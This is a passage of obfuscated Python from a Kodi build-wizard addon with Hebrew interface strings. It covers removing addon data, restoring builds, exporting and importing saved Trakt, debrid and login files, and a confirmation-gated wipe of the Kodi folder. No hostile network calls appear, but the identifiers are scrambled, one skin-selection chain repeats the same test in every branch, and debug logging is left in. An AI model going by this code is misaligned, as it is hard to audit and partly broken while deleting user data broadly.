		O0O0O00OOOO0O0OOO =os .path .join (ADDONS ,O000000000OO0O0O0 )#line:4639
		wiz .log ("Removing Addon %s"%O000000000OO0O0O0 )#line:4640
		wiz .cleanHouse (O0O0O00OOOO0O0OOO )#line:4641
		xbmc .sleep (1000 )#line:4642
		try :shutil .rmtree (O0O0O00OOOO0O0OOO )#line:4643
		except Exception as O000000O0OOOO0OO0 :wiz .log ("Error removing %s"%O000000000OO0O0O0 ,xbmc .LOGNOTICE )#line:4644
		removeAddonData (O000000000OO0O0O0 ,OO00000OOO00OOO00 ,over )#line:4645
	if over ==False :#line:4646
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO00000OOO00OOO00 ))#line:4647
def removeAddonData (OOO00OOO0OOO00O0O ,name =None ,over =False ):#line:4649
	if OOO00OOO0OOO00O0O =='all':#line:4650
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4651
			wiz .cleanHouse (ADDOND )#line:4652
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4653
	elif OOO00OOO0OOO00O0O =='uninstalled':#line:4654
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4655
			OOO0000O0O0OOOO00 =0 #line:4656
			for O0000OOOOOOOO00OO in glob .glob (os .path .join (ADDOND ,'*')):#line:4657
				O00O000OO0OO000O0 =O0000OOOOOOOO00OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4658
				if O00O000OO0OO000O0 in EXCLUDES :pass #line:4659
				elif os .path .exists (os .path .join (ADDONS ,O00O000OO0OO000O0 )):pass #line:4660
				else :wiz .cleanHouse (O0000OOOOOOOO00OO );OOO0000O0O0OOOO00 +=1 ;wiz .log (O0000OOOOOOOO00OO );shutil .rmtree (O0000OOOOOOOO00OO )#line:4661
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOO0000O0O0OOOO00 ))#line:4662
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4663
	elif OOO00OOO0OOO00O0O =='empty':#line:4664
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4665
			OOO0000O0O0OOOO00 =wiz .emptyfolder (ADDOND )#line:4666
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOO0000O0O0OOOO00 ))#line:4667
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4668
	else :#line:4669
		O0OO0O00O0O00000O =os .path .join (USERDATA ,'addon_data',OOO00OOO0OOO00O0O )#line:4670
		if OOO00OOO0OOO00O0O in EXCLUDES :#line:4671
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4672
		elif os .path .exists (O0OO0O00O0O00000O ):#line:4673
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO00OOO0OOO00O0O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4674
				wiz .cleanHouse (O0OO0O00O0O00000O )#line:4675
				try :#line:4676
					shutil .rmtree (O0OO0O00O0O00000O )#line:4677
				except :#line:4678
					wiz .log ("Error deleting: %s"%O0OO0O00O0O00000O )#line:4679
			else :#line:4680
				wiz .log ('Addon data for %s was not removed'%OOO00OOO0OOO00O0O )#line:4681
	wiz .refresh ()#line:4682
def restoreit (OO000OO0OO00O00O0 ):#line:4684
	if OO000OO0OO00O00O0 =='build':#line:4685
		O0OO0O0OOO0O0OO00 =freshStart ('restore')#line:4686
		if O0OO0O0OOO0O0OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4687
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4688
		wiz .skinToDefault ()#line:4689
	wiz .restoreLocal (OO000OO0OO00O00O0 )#line:4690
def restoreextit (O0OOOO0OOOO00OOOO ):#line:4692
	if O0OOOO0OOOO00OOOO =='build':#line:4693
		OOO00000000OOOO0O =freshStart ('restore')#line:4694
		if OOO00000000OOOO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4695
	wiz .restoreExternal (O0OOOO0OOOO00OOOO )#line:4696
def buildInfo (OO0O0O000OOOO0OOO ):#line:4698
	if wiz .workingURL (SPEEDFILE )==True :#line:4699
		if wiz .checkBuild (OO0O0O000OOOO0OOO ,'url'):#line:4700
			OO0O0O000OOOO0OOO ,O0O0OO000O000OO00 ,OO000OOOO0O0O000O ,OOOO00OOOO0OO0O0O ,OOOOO0OOO0OO0O00O ,O0OOO0OOO00000O00 ,O00O0O00OO0O0O00O ,OO0OO0O000OO000O0 ,OO0OOOOOO00O000OO ,O00O000000OOO0000 ,OO00O0OOO0000OOOO =wiz .checkBuild (OO0O0O000OOOO0OOO ,'all')#line:4701
			O00O000000OOO0000 ='Yes'if O00O000000OOO0000 .lower ()=='yes'else 'No'#line:4702
			OO0OOO000OOOO0OOO ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O0O000OOOO0OOO )#line:4703
			OO0OOO000OOOO0OOO +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O0OO000O000OO00 )#line:4704
			if not O0OOO0OOO00000O00 =="http://":#line:4705
				OO000O0O0O000OOO0 =wiz .themeCount (OO0O0O000OOOO0OOO ,False )#line:4706
				OO0OOO000OOOO0OOO +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OO000O0O0O000OOO0 ))#line:4707
			OO0OOO000OOOO0OOO +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOO0OOO0OO0O00O )#line:4708
			OO0OOO000OOOO0OOO +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O000000OOO0000 )#line:4709
			OO0OOO000OOOO0OOO +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00O0OOO0000OOOO )#line:4710
			wiz .TextBox (ADDONTITLE ,OO0OOO000OOOO0OOO )#line:4711
		else :wiz .log ("Invalid Build Name!")#line:4712
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4713
def buildVideo (O00OO0000OO0O000O ):#line:4715
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4716
	if wiz .workingURL (SPEEDFILE )==True :#line:4717
		OOO0O0OO0OO0O0O00 =wiz .checkBuild (O00OO0000OO0O000O ,'preview')#line:4718
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O00OO0000OO0O000O )#line:4719
		if OOO0O0OO0OO0O0O00 and not OOO0O0OO0OO0O0O00 =='http://':playVideo (OOO0O0OO0OO0O0O00 )#line:4720
		else :wiz .log ("[%s]Unable to find url for video preview"%O00OO0000OO0O000O )#line:4721
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4722
def dependsList (OO0OO0000OO0000O0 ):#line:4724
	OO00O000OOO000OO0 =os .path .join (ADDONS ,OO0OO0000OO0000O0 ,'addon.xml')#line:4725
	if os .path .exists (OO00O000OOO000OO0 ):#line:4726
		OOOOOOOO00000OOOO =open (OO00O000OOO000OO0 ,mode ='r');OO0000000OO0O0O0O =OOOOOOOO00000OOOO .read ();OOOOOOOO00000OOOO .close ();#line:4727
		O000O0OOO0O0OOOOO =wiz .parseDOM (OO0000000OO0O0O0O ,'import',ret ='addon')#line:4728
		O0O0O00O000OOO0O0 =[]#line:4729
		for O0OOOO0O000000OO0 in O000O0OOO0O0OOOOO :#line:4730
			if not 'xbmc.python'in O0OOOO0O000000OO0 :#line:4731
				O0O0O00O000OOO0O0 .append (O0OOOO0O000000OO0 )#line:4732
		return O0O0O00O000OOO0O0 #line:4733
	return []#line:4734
def manageSaveData (OO0OOOO00000O0000 ):#line:4736
	if OO0OOOO00000O0000 =='import':#line:4737
		O00O0OOOO0O0O0000 =os .path .join (ADDONDATA ,'temp')#line:4738
		if not os .path .exists (O00O0OOOO0O0O0000 ):os .makedirs (O00O0OOOO0O0O0000 )#line:4739
		OO00O00O0O00O00OO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4740
		if not OO00O00O0O00O00OO .endswith ('.zip'):#line:4741
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4742
			return #line:4743
		OOO00OOOO00000OO0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4744
		O00O0O0O0O0O00000 =xbmcvfs .copy (OO00O00O0O00O00OO ,OOO00OOOO00000OO0 )#line:4745
		wiz .log ("%s"%str (O00O0O0O0O0O00000 ))#line:4746
		extract .all (xbmc .translatePath (OOO00OOOO00000OO0 ),O00O0OOOO0O0O0000 )#line:4747
		OOOO0O0OOOO000000 =os .path .join (O00O0OOOO0O0O0000 ,'trakt')#line:4748
		O0O0000O0O000OO00 =os .path .join (O00O0OOOO0O0O0000 ,'login')#line:4749
		OOO0O0O0OO0O0O00O =os .path .join (O00O0OOOO0O0O0000 ,'debrid')#line:4750
		OOO000O00OO00OOO0 =0 #line:4751
		if os .path .exists (OOOO0O0OOOO000000 ):#line:4752
			OOO000O00OO00OOO0 +=1 #line:4753
			O0000O0O000OOOO0O =os .listdir (OOOO0O0OOOO000000 )#line:4754
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4755
			for OO00OO00OOOO00OO0 in O0000O0O000OOOO0O :#line:4756
				OO000OOO0O0OOOO0O =os .path .join (traktit .TRAKTFOLD ,OO00OO00OOOO00OO0 )#line:4757
				O0O00000O0000000O =os .path .join (OOOO0O0OOOO000000 ,OO00OO00OOOO00OO0 )#line:4758
				if os .path .exists (OO000OOO0O0OOOO0O ):#line:4759
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00OO00OOOO00OO0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4760
					else :os .remove (OO000OOO0O0OOOO0O )#line:4761
				shutil .copy (O0O00000O0000000O ,OO000OOO0O0OOOO0O )#line:4762
			traktit .importlist ('all')#line:4763
			traktit .traktIt ('restore','all')#line:4764
		if os .path .exists (O0O0000O0O000OO00 ):#line:4765
			OOO000O00OO00OOO0 +=1 #line:4766
			O0000O0O000OOOO0O =os .listdir (O0O0000O0O000OO00 )#line:4767
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4768
			for OO00OO00OOOO00OO0 in O0000O0O000OOOO0O :#line:4769
				OO000OOO0O0OOOO0O =os .path .join (loginit .LOGINFOLD ,OO00OO00OOOO00OO0 )#line:4770
				O0O00000O0000000O =os .path .join (O0O0000O0O000OO00 ,OO00OO00OOOO00OO0 )#line:4771
				if os .path .exists (OO000OOO0O0OOOO0O ):#line:4772
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00OO00OOOO00OO0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4773
					else :os .remove (OO000OOO0O0OOOO0O )#line:4774
				shutil .copy (O0O00000O0000000O ,OO000OOO0O0OOOO0O )#line:4775
			loginit .importlist ('all')#line:4776
			loginit .loginIt ('restore','all')#line:4777
		if os .path .exists (OOO0O0O0OO0O0O00O ):#line:4778
			OOO000O00OO00OOO0 +=1 #line:4779
			O0000O0O000OOOO0O =os .listdir (OOO0O0O0OO0O0O00O )#line:4780
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4781
			for OO00OO00OOOO00OO0 in O0000O0O000OOOO0O :#line:4782
				OO000OOO0O0OOOO0O =os .path .join (debridit .REALFOLD ,OO00OO00OOOO00OO0 )#line:4783
				O0O00000O0000000O =os .path .join (OOO0O0O0OO0O0O00O ,OO00OO00OOOO00OO0 )#line:4784
				if os .path .exists (OO000OOO0O0OOOO0O ):#line:4785
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00OO00OOOO00OO0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4786
					else :os .remove (OO000OOO0O0OOOO0O )#line:4787
				shutil .copy (O0O00000O0000000O ,OO000OOO0O0OOOO0O )#line:4788
			debridit .importlist ('all')#line:4789
			debridit .debridIt ('restore','all')#line:4790
		wiz .cleanHouse (O00O0OOOO0O0O0000 )#line:4791
		wiz .removeFolder (O00O0OOOO0O0O0000 )#line:4792
		os .remove (OOO00OOOO00000OO0 )#line:4793
		if OOO000O00OO00OOO0 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4794
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4795
	elif OO0OOOO00000O0000 =='export':#line:4796
		O0O0OOO0OO0O000O0 =xbmc .translatePath (MYBUILDS )#line:4797
		OO000OO000OO0O000 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4798
		traktit .traktIt ('update','all')#line:4799
		loginit .loginIt ('update','all')#line:4800
		debridit .debridIt ('update','all')#line:4801
		OO00O00O0O00O00OO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4802
		OO00O00O0O00O00OO =xbmc .translatePath (OO00O00O0O00O00OO )#line:4803
		OOO0OO00O0OO0000O =os .path .join (O0O0OOO0OO0O000O0 ,'SaveData.zip')#line:4804
		OOO0000O000OOOOO0 =zipfile .ZipFile (OOO0OO00O0OO0000O ,mode ='w')#line:4805
		for OO0OOO0OOO0O0OO00 in OO000OO000OO0O000 :#line:4806
			if os .path .exists (OO0OOO0OOO0O0OO00 ):#line:4807
				O0000O0O000OOOO0O =os .listdir (OO0OOO0OOO0O0OO00 )#line:4808
				for OO00O00O00OOO0O00 in O0000O0O000OOOO0O :#line:4809
					OOO0000O000OOOOO0 .write (os .path .join (OO0OOO0OOO0O0OO00 ,OO00O00O00OOO0O00 ),os .path .join (OO0OOO0OOO0O0OO00 ,OO00O00O00OOO0O00 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4810
		OOO0000O000OOOOO0 .close ()#line:4811
		if OO00O00O0O00O00OO ==O0O0OOO0OO0O000O0 :#line:4812
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO00O0OO0000O ))#line:4813
		else :#line:4814
			try :#line:4815
				xbmcvfs .copy (OOO0OO00O0OO0000O ,os .path .join (OO00O00O0O00O00OO ,'SaveData.zip'))#line:4816
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OO00O00O0O00O00OO ,'SaveData.zip')))#line:4817
			except :#line:4818
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO00O0OO0000O ))#line:4819
def freshStart (install =None ,over =False ):#line:4824
	if USERNAME =='':#line:4825
		ADDON .openSettings ()#line:4826
		sys .exit ()#line:4827
	O0O00000OO0OO0OO0 =(SPEEDFILE )#line:4828
	(O0O00000OO0OO0OO0 )#line:4829
	O000O00OOOO0O0O00 =(wiz .workingURL (O0O00000OO0OO0OO0 ))#line:4830
	(O000O00OOOO0O0O00 )#line:4831
	if KEEPTRAKT =='true':#line:4832
		traktit .autoUpdate ('all')#line:4833
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4834
	if KEEPREAL =='true':#line:4835
		debridit .autoUpdate ('all')#line:4836
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4837
	if KEEPLOGIN =='true':#line:4838
		loginit .autoUpdate ('all')#line:4839
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4840
	if over ==True :O000O0OO00OOO0000 =1 #line:4841
	elif install =='restore':O000O0OO00OOO0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4842
	elif install :O000O0OO00OOO0000 =1 #line:4843
	else :O000O0OO00OOO0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4844
	if O000O0OO00OOO0000 :#line:4845
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4846
			OO0O00O000O00OO0O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4847
			skinSwitch .swapSkins (OO0O00O000O00OO0O )#line:4850
			O00OO00O00O0O0OOO =0 #line:4851
			xbmc .sleep (1000 )#line:4852
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO00O00O0O0OOO <150 :#line:4853
				O00OO00O00O0O0OOO +=1 #line:4854
				xbmc .sleep (1000 )#line:4855
				wiz .ebi ('SendAction(Select)')#line:4856
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4857
				wiz .ebi ('SendClick(11)')#line:4858
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4859
			xbmc .sleep (1000 )#line:4860
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4861
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4862
			return #line:4863
		wiz .addonUpdates ('set')#line:4864
		OO0OOOO0O0000O0O0 =os .path .abspath (HOME )#line:4865
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4866
		O00OO00OOO000OOOO =sum ([len (O0OO00O0O0O000O00 )for O000OO0O0OO0O0OOO ,O00O00OO00OO00OOO ,O0OO00O0O0O000O00 in os .walk (OO0OOOO0O0000O0O0 )]);O0O0O0OOO000OO00O =0 #line:4867
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4868
		EXCLUDES .append ('My_Builds')#line:4869
		EXCLUDES .append ('archive_cache')#line:4870
		EXCLUDES .append ('script.module.requests')#line:4871
		EXCLUDES .append ('myfav.anon')#line:4872
		if KEEPREPOS =='true':#line:4873
			O0OO000OO00O00OO0 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4874
			for O000O000O00OO00OO in O0OO000OO00O00OO0 :#line:4875
				OOOOO000O0OO00OO0 =os .path .split (O000O000O00OO00OO [:-1 ])[1 ]#line:4876
				if not OOOOO000O0OO00OO0 ==EXCLUDES :#line:4877
					EXCLUDES .append (OOOOO000O0OO00OO0 )#line:4878
		if KEEPSUPER =='true':#line:4879
			EXCLUDES .append ('plugin.program.super.favourites')#line:4880
		if KEEPMOVIELIST =='true':#line:4881
			EXCLUDES .append ('plugin.video.metalliq')#line:4882
		if KEEPMOVIELIST =='true':#line:4883
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4884
		if KEEPADDONS =='true':#line:4885
			EXCLUDES .append ('addons')#line:4886
		if KEEPTELEMEDIA =='true':#line:4887
			EXCLUDES .append ('plugin.video.telemedia')#line:4888
		EXCLUDES .append ('plugin.video.elementum')#line:4893
		EXCLUDES .append ('script.elementum.burst')#line:4894
		EXCLUDES .append ('script.elementum.burst-master')#line:4895
		EXCLUDES .append ('plugin.video.quasar')#line:4896
		EXCLUDES .append ('script.quasar.burst')#line:4897
		EXCLUDES .append ('skin.estuary')#line:4898
		if KEEPWHITELIST =='true':#line:4901
			O0OO0000OOOO0OO0O =''#line:4902
			OOOOOO0O0O0O0O000 =wiz .whiteList ('read')#line:4903
			if len (OOOOOO0O0O0O0O000 )>0 :#line:4904
				for O000O000O00OO00OO in OOOOOO0O0O0O0O000 :#line:4905
					try :OO0O0O00OO00OOOO0 ,O0OOOOOOO0O000OOO ,O0000O0OOOOO0O0OO =O000O000O00OO00OO #line:4906
					except :pass #line:4907
					if O0000O0OOOOO0O0OO .startswith ('pvr'):O0OO0000OOOO0OO0O =O0OOOOOOO0O000OOO #line:4908
					OO000OO0OOO00O00O =dependsList (O0000O0OOOOO0O0OO )#line:4909
					for O0O000O000OO000O0 in OO000OO0OOO00O00O :#line:4910
						if not O0O000O000OO000O0 in EXCLUDES :#line:4911
							EXCLUDES .append (O0O000O000OO000O0 )#line:4912
						O0O000OOOO0O0O00O =dependsList (O0O000O000OO000O0 )#line:4913
						for OOO000O00OO0OOO0O in O0O000OOOO0O0O00O :#line:4914
							if not OOO000O00OO0OOO0O in EXCLUDES :#line:4915
								EXCLUDES .append (OOO000O00OO0OOO0O )#line:4916
					if not O0000O0OOOOO0O0OO in EXCLUDES :#line:4917
						EXCLUDES .append (O0000O0OOOOO0O0OO )#line:4918
				if not O0OO0000OOOO0OO0O =='':wiz .setS ('pvrclient',O0000O0OOOOO0O0OO )#line:4919
		if wiz .getS ('pvrclient')=='':#line:4920
			for O000O000O00OO00OO in EXCLUDES :#line:4921
				if O000O000O00OO00OO .startswith ('pvr'):#line:4922
					wiz .setS ('pvrclient',O000O000O00OO00OO )#line:4923
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4924
		O000OO0O0O0OOOO0O =wiz .latestDB ('Addons')#line:4925
		for O000OOOOO0OOO00O0 ,OOO0000000000O000 ,OO0OOOO00OO000O00 in os .walk (OO0OOOO0O0000O0O0 ,topdown =True ):#line:4926
			OOO0000000000O000 [:]=[O0O00000000OOOOOO for O0O00000000OOOOOO in OOO0000000000O000 if O0O00000000OOOOOO not in EXCLUDES ]#line:4927
			for OO0O0O00OO00OOOO0 in OO0OOOO00OO000O00 :#line:4928
				O0O0O0OOO000OO00O +=1 #line:4929
				O0000O0OOOOO0O0OO =O000OOOOO0OOO00O0 .replace ('/','\\').split ('\\')#line:4930
				O00OO00O00O0O0OOO =len (O0000O0OOOOO0O0OO )-1 #line:4932
				if O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4933
				elif OO0O0O00OO00OOOO0 =='MyVideos99.db'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4934
				elif OO0O0O00OO00OOOO0 =='MyVideos107.db'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4935
				elif OO0O0O00OO00OOOO0 =='MyVideos116.db'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4936
				elif OO0O0O00OO00OOOO0 =='MyVideos99.db'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4937
				elif OO0O0O00OO00OOOO0 =='MyVideos107.db'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4938
				elif OO0O0O00OO00OOOO0 =='MyVideos116.db'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4939
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4940
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'skin.anonymous.mod'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4941
